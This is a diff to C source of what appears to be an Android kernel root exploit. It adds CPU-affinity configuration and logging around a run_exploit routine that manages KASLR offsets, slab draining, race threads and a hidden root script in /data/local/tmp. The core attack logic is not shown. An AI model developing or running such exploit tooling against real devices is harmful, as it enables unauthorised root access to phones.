@@ -172,6 +172,7 @@ void *owner_thread(void *arg __attribute__((unused))) {
 void *consumer_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
   pin_to_core(CONSUMER_CORE);
+  pr_info("consumer thread running on cpu=%d\n", sched_getcpu());
   int seen = 0;
   while (!atomic_load(&punch_consume_stop)) {
     int seq = atomic_load(&punch_consume_go);
@@ -342,6 +343,55 @@ static void slab_drain(void) {
 
 static char g_home_dir[256] = "/data/local/tmp";
 static char g_root_script_path[300] = "/data/local/tmp/.ghostlock_root.sh";
+
+int g_core_main = 0;
+int g_core_consumer = 1;
+
+void init_cpu_config(void) {
+  g_core_main = 0;
+  g_core_consumer = 1;
+
+  const char *s = getenv("GHOSTLOCK_CORE");
+  if (s && *s) {
+    long v = strtol(s, NULL, 10);
+    if (v >= 0 && v < CPU_SETSIZE) {
+      g_core_main = (int)v;
+    } else {
+      pr_warning("invalid GHOSTLOCK_CORE=%s, using %d\n", s, g_core_main);
+    }
+  }
+  s = getenv("GHOSTLOCK_CONSUMER_CORE");
+  if (s && *s) {
+    long v = strtol(s, NULL, 10);
+    if (v >= 0 && v < CPU_SETSIZE) {
+      g_core_consumer = (int)v;
+    } else {
+      pr_warning("invalid GHOSTLOCK_CONSUMER_CORE=%s, using %d\n", s,
+                 g_core_consumer);
+    }
+  } else {
+    g_core_consumer = g_core_main + 1;
+  }
+
+  if (g_core_main == g_core_consumer) {
+    pr_warning("main and consumer cores are the same (%d); falling back\n",
+               g_core_main);
+    g_core_main = 0;
+    g_core_consumer = 1;
+  }
+
+  cpu_set_t allowed;
+  if (sched_getaffinity(0, sizeof(allowed), &allowed) == 0 &&
+      (!CPU_ISSET(g_core_main, &allowed) ||
+       !CPU_ISSET(g_core_consumer, &allowed))) {
+    pr_warning("cores %d/%d not in allowed cpuset; falling back to 0/1\n",
+               g_core_main, g_core_consumer);
+    g_core_main = 0;
+    g_core_consumer = 1;
+  }
+
+  pr_info("cpu pair: main=%d consumer=%d\n", g_core_main, g_core_consumer);
+}
 
 static void init_runtime_paths(void) {
   const char *home = getenv("GHOSTLOCK_HOME");
@@ -749,6 +799,7 @@ int run_exploit(int argc, char **argv) {
   set_unbuffer();
   signal(SIGPIPE, SIG_IGN);
   set_limit();
+  init_cpu_config();
   init_runtime_paths();
   write_root_script();
 
@@ -758,6 +809,7 @@ int run_exploit(int argc, char **argv) {
   init_p0_profile();
   init_ashmem_path();
   pin_to_core(CORE);
+  pr_info("main thread running on cpu=%d\n", sched_getcpu());
 
   kaslr_slide = 0;
   kaslr_base = KIMAGE_TEXT_BASE;
